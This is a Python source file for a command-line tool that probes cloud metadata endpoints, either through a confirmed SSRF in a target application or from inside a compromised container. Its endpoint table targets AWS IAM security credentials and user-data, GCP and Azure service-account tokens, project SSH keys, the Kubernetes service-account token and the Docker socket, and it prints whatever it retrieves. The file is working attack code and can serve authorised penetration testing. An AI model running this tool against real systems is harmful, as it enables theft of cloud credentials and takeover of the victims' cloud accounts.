#!/usr/bin/env python3
"""cloud-metadata-probe — probe cloud metadata endpoints via SSRF or directly.

Tests IMDSv1 (AWS), IMDSv2 (AWS token-based), GCP, Azure, and Oracle Cloud
metadata endpoints. When SSRF is confirmed, use --ssrf-url to route probes
through the target application and determine what cloud credentials/metadata
are accessible to the target process.

Usage:
  # Via SSRF: replace PAYLOAD in the target's fetch URL
  cloud-metadata-probe --ssrf-url "http://10.0.0.1/fetch?url=PAYLOAD"
  cloud-metadata-probe --ssrf-url "http://10.0.0.1/preview" --ssrf-param url \
                       --method POST --header "Authorization: Bearer TOKEN" \
                       --body-template '{"url":"PAYLOAD","timeout":5}'

  # Direct: run this from inside the target container (e.g. RCE, or from sandbox)
  cloud-metadata-probe --direct
"""
import sys, json, argparse, time
try:
    import urllib.request, urllib.error, urllib.parse
except ImportError:
    pass

ENDPOINTS = {
    "aws_imdsv1_ami":      ("http://169.254.169.254/latest/meta-data/ami-id",           "AWS"),
    "aws_imdsv1_iam":      ("http://169.254.169.254/latest/meta-data/iam/info",          "AWS"),
    "aws_imdsv1_creds":    ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "AWS"),
    "aws_imdsv1_userdata": ("http://169.254.169.254/latest/user-data",                   "AWS"),
    "aws_imdsv2_token":    ("http://169.254.169.254/latest/api/token",                   "AWS_v2"),
    "gcp_project":         ("http://metadata.google.internal/computeMetadata/v1/project/project-id", "GCP"),
    "gcp_token":           ("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", "GCP"),
    "gcp_email":           ("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email", "GCP"),
    "gcp_ssh_keys":        ("http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys", "GCP"),
    "azure_subscriptions": ("http://169.254.169.254/metadata/subscriptions?api-version=2021-02-01", "Azure"),
    "azure_identity":      ("http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/", "Azure"),
    "oracle_metadata":     ("http://169.254.169.254/opc/v2/instance/",                  "Oracle"),
    "alibaba_metadata":    ("http://100.100.100.200/latest/meta-data/",                  "Alibaba"),
    "kubernetes_serviceaccount": ("file:///var/run/secrets/kubernetes.io/serviceaccount/token", "K8s"),
    "docker_socket":       ("http://localhost:2375/info",                                "Docker"),
}

GCP_HEADERS = {"Metadata-Flavor": "Google"}
AZURE_HEADERS = {"Metadata": "true"}
IMDSV2_TOKEN_HEADERS = {"X-aws-ec2-metadata-token-ttl-seconds": "21600"}

def fetch_direct(url, extra_headers=None, method="GET", timeout=3):
    headers = extra_headers or {}
    try:
        req = urllib.request.Request(url, headers=headers, method=method)
        with urllib.request.urlopen(req, timeout=timeout) as r:
            body = r.read(2048).decode(errors="replace")
            return r.status, body
    except urllib.error.HTTPError as e:
        return e.code, e.read(512).decode(errors="replace")
    except Exception as e:
        return None, str(e)

def fetch_via_ssrf(ssrf_url, target_url, ssrf_param, method, body_template, headers, timeout=10):
    if body_template:
        body = body_template.replace("PAYLOAD", target_url).encode()
        req_method = method or "POST"
        h = {"Content-Type": "application/json"}
        h.update(headers)
        req = urllib.request.Request(ssrf_url, data=body, headers=h, method=req_method)
    else:
        encoded = urllib.parse.quote(target_url, safe="")
        url = ssrf_url.replace("PAYLOAD", encoded)
        h = dict(headers)
        req = urllib.request.Request(url, headers=h, method=method or "GET")
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            body = r.read(4096).decode(errors="replace")
            return r.status, body
    except urllib.error.HTTPError as e:
        return e.code, e.read(512).decode(errors="replace")
    except Exception as e:
        return None, str(e)

def probe(name, url, cloud, mode, ssrf_url, ssrf_param, method, body_template, req_headers):
    extra = {}
    if cloud == "GCP":
        extra = GCP_HEADERS
    elif cloud == "Azure":
        extra = AZURE_HEADERS
    elif name == "aws_imdsv2_token":
        extra = IMDSV2_TOKEN_HEADERS

    if mode == "direct":
        status, body = fetch_direct(url, extra)
    else:
        all_headers = {**extra, **req_headers}
        status, body = fetch_via_ssrf(ssrf_url, url, ssrf_param, method, body_template, all_headers)

    hit = status == 200 and len(body) > 5 and "error" not in body.lower()[:50]
    return {
        "name":    name,
        "cloud":   cloud,
        "url":     url,
        "status":  status,
        "hit":     hit,
        "snippet": body[:300] if hit else body[:80],
    }

def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--direct",        action="store_true", help="Probe directly (from inside target network)")
    ap.add_argument("--ssrf-url",      default="",          help="SSRF URL with PAYLOAD placeholder")
    ap.add_argument("--ssrf-param",    default="url")
    ap.add_argument("--method",        default="GET")
    ap.add_argument("--header",        action="append",     default=[], metavar="K:V")
    ap.add_argument("--body-template", default="",          help="POST body template with PAYLOAD placeholder")
    ap.add_argument("--category",      default="all",       help="all | aws | gcp | azure | k8s | docker")
    args = ap.parse_args()

    if not args.direct and not args.ssrf_url:
        ap.error("Provide --direct or --ssrf-url")

    headers = {}
    for h in args.header:
        if ":" in h:
            k, v = h.split(":", 1)
            headers[k.strip()] = v.strip()

    mode = "direct" if args.direct else "ssrf"
    cat  = args.category.lower()

    results = []
    hits = []
    for name, (url, cloud) in ENDPOINTS.items():
        if cat != "all" and cat not in cloud.lower() and cat not in name:
            continue
        r = probe(name, url, cloud, mode, args.ssrf_url, args.ssrf_param,
                  args.method, args.body_template, headers)
        results.append(r)
        if r["hit"]:
            hits.append(r)
        time.sleep(0.1)

    print(json.dumps({
        "mode":          mode,
        "total_probed":  len(results),
        "hits":          len(hits),
        "finding":       "Cloud metadata accessible via SSRF" if hits else "No metadata endpoints reachable",
        "hit_details":   hits,
        "clouds_checked": sorted({r["cloud"] for r in results}),
        "miss_count":    len(results) - len(hits),
    }, indent=2))

if __name__ == "__main__":
    main()
